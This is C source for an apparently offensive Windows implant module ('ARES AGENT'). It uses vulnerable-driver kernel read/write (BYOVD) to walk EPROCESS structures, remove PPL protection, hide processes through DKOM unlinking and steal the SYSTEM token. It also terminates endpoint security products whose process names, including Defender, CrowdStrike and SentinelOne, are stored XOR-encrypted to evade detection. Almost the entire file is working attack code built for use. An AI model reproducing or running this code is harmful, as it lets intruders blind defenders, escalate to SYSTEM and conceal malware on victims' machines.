/*
 * ═══════════════════════════════════════════════════════════════
 *  ARES AGENT — EPROCESS Kernel Walker
 *
 *  Uses BYOVD kernel R/W to:
 *    1. Find ntoskrnl.exe base via NtQuerySystemInformation
 *    2. Read PsInitialSystemProcess pointer
 *    3. Walk EPROCESS ActiveProcessLinks doubly-linked list
 *    4. Find target process EPROCESS by ImageFileName
 *    5. Manipulate kernel structures (remove PPL, hide process)
 *
 *  Windows 10/11 21H2+ EPROCESS offsets (build 19041+)
 * ═══════════════════════════════════════════════════════════════
 */

#include "ares_agent.h"
#if __has_include("ares_config.h")
#include "ares_config.h"
#endif
#include "ares_strings.h"
#include <stdio.h>
#include <string.h>

/* ── EPROCESS Offsets (Windows 10 21H2 / 11 22H2) ── */
/* These vary by build — should be resolved dynamically */

typedef struct _EPROCESS_OFFSETS {
    DWORD UniqueProcessId;        /* HANDLE */
    DWORD ActiveProcessLinks;     /* LIST_ENTRY */
    DWORD ImageFileName;          /* CHAR[15] */
    DWORD Protection;             /* PS_PROTECTION */
    DWORD Token;                  /* EX_FAST_REF */
    DWORD SignatureLevel;         /* UCHAR */
    DWORD SectionSignatureLevel;  /* UCHAR */
    DWORD Flags;                  /* ULONG */
    DWORD Flags2;                 /* ULONG */
    DWORD Flags3;                 /* ULONG */
} EPROCESS_OFFSETS;

/* v3.2: Dynamic offset resolution — matches byovd.c pattern.
 * Default offsets for Windows 10 21H2+ (build 19044), overridden at runtime. */
static EPROCESS_OFFSETS g_offsets = {0};
static BOOL g_offsets_resolved = FALSE;

static BOOL _resolve_ep_offsets(void) {
    if (g_offsets_resolved) return TRUE;
    typedef NTSTATUS (NTAPI *pRtlGetVersion)(PRTL_OSVERSIONINFOW);
    pRtlGetVersion fn = (pRtlGetVersion)GetProcAddress(
        GetModuleHandleW(L"ntdll.dll"), "RtlGetVersion");
    if (!fn) return FALSE;
    RTL_OSVERSIONINFOW ver = { sizeof(ver) };
    fn(&ver);
    DWORD build = ver.dwBuildNumber;
    /* Windows 10 21H2 (19044) — most common */
    if (build >= 19041 && build <= 19045) {
        g_offsets = (EPROCESS_OFFSETS){0x440,0x448,0x5A8,0x87A,0x4B8,0x878,0x879,0x460,0x464,0x468};
    } else if (build >= 22000 && build <= 22631) {
        /* Windows 11 21H2-23H2 */
        g_offsets = (EPROCESS_OFFSETS){0x440,0x448,0x5A8,0x87A,0x4B8,0x878,0x879,0x460,0x464,0x468};
    } else if (build >= 26000) {
        /* Windows 11 24H2+ */
        g_offsets = (EPROCESS_OFFSETS){0x448,0x450,0x5B0,0x882,0x4C0,0x880,0x881,0x468,0x46C,0x470};
    } else {
        /* v3.5: REFUSE to operate on unknown builds.
         * Blind offset guess risks BSOD on kernel read at wrong address.
         * BYOVD pipeline will abort safely upstream. */
        return FALSE;
    }
    g_offsets_resolved = TRUE;
    return TRUE;
}

/* ── SystemModuleInformation — find kernel base ── */

#define SystemModuleInformation 11

typedef struct _RTL_PROCESS_MODULE_INFORMATION {
    HANDLE Section;
    PVOID  MappedBase;
    PVOID  ImageBase;
    ULONG  ImageSize;
    ULONG  Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR  FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
    ULONG NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES;

typedef NTSTATUS (NTAPI *pfnNtQuerySystemInformation)(
    ULONG, PVOID, ULONG, PULONG);

static DWORD64 get_kernel_base(void)
{
    pfnNtQuerySystemInformation pNtQSI =
        (pfnNtQuerySystemInformation)GetProcAddress(
            GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");
    if (!pNtQSI) return 0;

    /* First call to get size */
    ULONG needed = 0;
    pNtQSI(SystemModuleInformation, NULL, 0, &needed);
    if (needed == 0) return 0;

    RTL_PROCESS_MODULES* modules =
        (RTL_PROCESS_MODULES*)HeapAlloc(GetProcessHeap(), 0, needed);

    NTSTATUS status = pNtQSI(SystemModuleInformation, modules, needed, &needed);
    if (status != 0) {
        HeapFree(GetProcessHeap(), 0, modules);
        return 0;
    }

    /* First module is always ntoskrnl.exe */
    DWORD64 kernelBase = (DWORD64)modules->Modules[0].ImageBase;

    HeapFree(GetProcessHeap(), 0, modules);
    return kernelBase;
}

/* ── Find PsInitialSystemProcess in kernel memory ── */

static DWORD64 get_ps_initial_system_process(DWORD64 kernel_base)
{
    /* Load ntoskrnl.exe in usermode to find export RVA */
    HMODULE hKernel = LoadLibraryExW(L"ntoskrnl.exe", NULL,
        DONT_RESOLVE_DLL_REFERENCES);
    if (!hKernel) return 0;

    BYTE* pExport = (BYTE*)GetProcAddress(hKernel, "PsInitialSystemProcess");
    if (!pExport) {
        FreeLibrary(hKernel);
        return 0;
    }

    /* Calculate RVA */
    DWORD64 rva = (DWORD64)(pExport - (BYTE*)hKernel);
    FreeLibrary(hKernel);

    /* Real kernel address of PsInitialSystemProcess pointer */
    DWORD64 ptrAddr = kernel_base + rva;

    /* Read pointer value from kernel memory via BYOVD */
    DWORD64 systemEprocess = 0;
    if (!Ares_BYOVD_ReadKernelMemory((PVOID)ptrAddr, &systemEprocess, sizeof(DWORD64)))
        return 0;

    return systemEprocess;
}

/* ── Walk EPROCESS linked list ── */

/* KERNEL_PROCESS_INFO is defined in ares_agent.h */


int Ares_WalkProcessList(KERNEL_PROCESS_INFO* procs, int max_procs)
{
    int count = 0;

    DWORD64 kernelBase = get_kernel_base();
    if (kernelBase == 0) return 0;

    /* v3.2: Resolve offsets dynamically */
    if (!_resolve_ep_offsets()) return 0;

    DWORD64 systemEprocess = get_ps_initial_system_process(kernelBase);
    if (systemEprocess == 0) return 0;

    /* Head of the linked list */
    DWORD64 head = systemEprocess + g_offsets.ActiveProcessLinks;
    DWORD64 current = head;

    /* Read first link */
    DWORD64 flink = 0;
    Ares_BYOVD_ReadKernelMemory((PVOID)current, &flink, sizeof(DWORD64));

    int iterations = 0;
    while (flink != head && flink != 0 && iterations < 1000 && count < max_procs) {
        /* EPROCESS = ActiveProcessLinks - offset */
        DWORD64 eprocess = flink - g_offsets.ActiveProcessLinks;

        KERNEL_PROCESS_INFO* info = &procs[count];
        info->eprocess = eprocess;

        /* Read PID */
        Ares_BYOVD_ReadKernelMemory(
            (PVOID)(eprocess + g_offsets.UniqueProcessId),
            &info->pid, sizeof(DWORD64));

        /* Read ImageFileName (15 chars max) */
        Ares_BYOVD_ReadKernelMemory(
            (PVOID)(eprocess + g_offsets.ImageFileName),
            info->name, 15);
        info->name[15] = '\0';

        /* Read Protection */
        Ares_BYOVD_ReadKernelMemory(
            (PVOID)(eprocess + g_offsets.Protection),
            &info->protection, 1);

        /* Read SignatureLevel */
        Ares_BYOVD_ReadKernelMemory(
            (PVOID)(eprocess + g_offsets.SignatureLevel),
            &info->signatureLevel, 1);

        count++;

        /* Follow next link */
        Ares_BYOVD_ReadKernelMemory((PVOID)flink, &flink, sizeof(DWORD64));
        iterations++;
    }

    return count;
}

/* ── Find EPROCESS by name ── */

DWORD64 Ares_FindEprocess(const char* process_name)
{
    /* v3.2: Reduced from 512 to 256 to prevent stack overflow (each entry ~40 bytes) */
    KERNEL_PROCESS_INFO procs[256];
    int count = Ares_WalkProcessList(procs, 256);

    DWORD64 result = 0;
    for (int i = 0; i < count; i++) {
        if (_stricmp(procs[i].name, process_name) == 0) {
            result = procs[i].eprocess;
            break;
        }
    }
    /* v3.2: Wipe kernel data from stack */
    SecureZeroMemory(procs, sizeof(procs));
    return result;
}

/* ── Remove PPL Protection from EPROCESS ── */

BOOL Ares_RemovePPL(DWORD64 eprocess)
{
    if (eprocess == 0) return FALSE;

    /* Zero out PS_PROTECTION structure (1 byte) */
    BYTE zero = 0;
    if (!Ares_BYOVD_WriteKernelMemory(
        (PVOID)(eprocess + g_offsets.Protection), &zero, 1))
        return FALSE;

    /* Also zero SignatureLevel + SectionSignatureLevel */
    Ares_BYOVD_WriteKernelMemory(
        (PVOID)(eprocess + g_offsets.SignatureLevel), &zero, 1);
    Ares_BYOVD_WriteKernelMemory(
        (PVOID)(eprocess + g_offsets.SectionSignatureLevel), &zero, 1);

    return TRUE;
}

/* ── Hide Process from EPROCESS list (DKOM) ── */

BOOL Ares_HideProcess(DWORD64 eprocess)
{
    if (eprocess == 0) return FALSE;

    /*
     * Direct Kernel Object Manipulation (DKOM):
     * Unlink process from ActiveProcessLinks doubly-linked list.
     *
     * Before: prev <-> target <-> next
     * After:  prev <-> next (target invisible to Task Manager)
     *
     * WARNING: Process still runs but invisible to:
     *   - Task Manager, Process Explorer
     *   - EnumProcesses, NtQuerySystemInformation
     *   - Most EDR process enumeration
     */

    DWORD64 linkOffset = eprocess + g_offsets.ActiveProcessLinks;

    /* Read target's Flink and Blink */
    DWORD64 flink = 0, blink = 0;
    Ares_BYOVD_ReadKernelMemory((PVOID)(linkOffset), &flink, sizeof(DWORD64));
    Ares_BYOVD_ReadKernelMemory((PVOID)(linkOffset + 8), &blink, sizeof(DWORD64));

    if (flink == 0 || blink == 0) return FALSE;

    /* prev->Flink = target->Flink */
    Ares_BYOVD_WriteKernelMemory((PVOID)(blink), &flink, sizeof(DWORD64));

    /* next->Blink = target->Blink */
    Ares_BYOVD_WriteKernelMemory((PVOID)(flink + 8), &blink, sizeof(DWORD64));

    /* Point target at itself (prevent BSOD on exit) */
    Ares_BYOVD_WriteKernelMemory((PVOID)(linkOffset), &linkOffset, sizeof(DWORD64));
    Ares_BYOVD_WriteKernelMemory((PVOID)(linkOffset + 8), &linkOffset, sizeof(DWORD64));

    return TRUE;
}

/* ── Token Stealing (elevate to SYSTEM) ── */

BOOL Ares_StealSystemToken(DWORD64 target_eprocess)
{
    if (target_eprocess == 0) return FALSE;

    /* Find System process (PID 4) token */
    DWORD64 kernelBase = get_kernel_base();
    DWORD64 systemEprocess = get_ps_initial_system_process(kernelBase);
    if (systemEprocess == 0) return FALSE;

    /* Read SYSTEM token (EX_FAST_REF — lower 4 bits are ref count) */
    DWORD64 systemToken = 0;
    Ares_BYOVD_ReadKernelMemory(
        (PVOID)(systemEprocess + g_offsets.Token),
        &systemToken, sizeof(DWORD64));

    if (systemToken == 0) return FALSE;

    /* Write SYSTEM token to target process */
    Ares_BYOVD_WriteKernelMemory(
        (PVOID)(target_eprocess + g_offsets.Token),
        &systemToken, sizeof(DWORD64));

    return TRUE;
}

/* ── Full EDR Kill Pipeline ── */

BOOL Ares_KillEDR_Full(const char* edr_name)
{
    /* Step 1: Find EDR's EPROCESS */
    DWORD64 edrEprocess = Ares_FindEprocess(edr_name);
    if (edrEprocess == 0) return FALSE;

    /* Step 2: Remove PPL protection */
    Ares_RemovePPL(edrEprocess);

    /* Step 3: Find PID from EPROCESS */
    DWORD64 pid = 0;
    Ares_BYOVD_ReadKernelMemory(
        (PVOID)(edrEprocess + g_offsets.UniqueProcessId),
        &pid, sizeof(DWORD64));

    /* Step 4: TerminateProcess from usermode (now works without PPL)
     * v3.7 FIX-05: Use NtOpenProcess directly from ntdll to avoid
     * Win32 OpenProcess hook (EDR may re-block even after PPL removal) */
    typedef NTSTATUS (NTAPI *pfnNtOP)(PHANDLE, ACCESS_MASK, PVOID, PVOID);
    pfnNtOP pNtOP = (pfnNtOP)GetProcAddress(
        GetModuleHandleW(L"ntdll.dll"), "NtOpenProcess");
    HANDLE hProc = NULL;
    if (pNtOP) {
        struct { ULONG len; HANDLE rh; ULONG oid; PVOID sd; } oa = {sizeof(oa),0,0,0};
        struct { ULONG pid; ULONG cid; } ci = { (ULONG)pid, 0 };
        pNtOP(&hProc, PROCESS_TERMINATE, &oa, &ci);
    }
    if (hProc) {
        TerminateProcess(hProc, 1);
        CloseHandle(hProc);
        return TRUE;
    }

    return FALSE;
}

/* ── Known EDR Process Names (encrypted — no plaintext) ── */

/* EDR decoder macro array — decrypt on stack, compare, continue */
typedef struct { const BYTE* enc; int len; } EDR_ENTRY;
static const EDR_ENTRY g_edr_list[] = {
    { ENC_EDR_DEFENDER,      11 },
    { ENC_EDR_DEFENDER_ATP,  11 },
    { ENC_EDR_DEFENDER_IR,   11 },
    { ENC_EDR_DEFENDER_NDR,  12 },
    { ENC_EDR_CROWDSTRIKE,   15 },
    { ENC_EDR_CS_FALCON,     19 },
    { ENC_EDR_CARBON_BLACK,   6 },
    { ENC_EDR_CB_REPMGR,     10 },
    { ENC_EDR_CYLANCE,       14 },
    { ENC_EDR_S1_AGENT,      17 },
    { ENC_EDR_S1_HOST,       23 },
    { ENC_EDR_CORTEX,        10 },
    { ENC_EDR_TRAPS,          9 },
    { ENC_EDR_FIREEYE,        8 },
    { ENC_EDR_MCAFEE,         9 },
    { ENC_EDR_SOPHOS,        14 },
    { ENC_EDR_SOPHOS_CLEAN,  16 },
    { ENC_EDR_TRENDMICRO,    20 },
    { ENC_EDR_SYMANTEC,      20 },
    { NULL, 0 }
};

int Ares_KillAllEDR(void)
{
    int killed = 0;
    char name[64];
    for (int i = 0; g_edr_list[i].enc; i++) {
        _xd(name, g_edr_list[i].enc, g_edr_list[i].len, CFG_XOR_KEY);
        if (Ares_KillEDR_Full(name))
            killed++;
        SecureZeroMemory(name, sizeof(name)); /* Wipe from stack */
    }
    return killed;
}
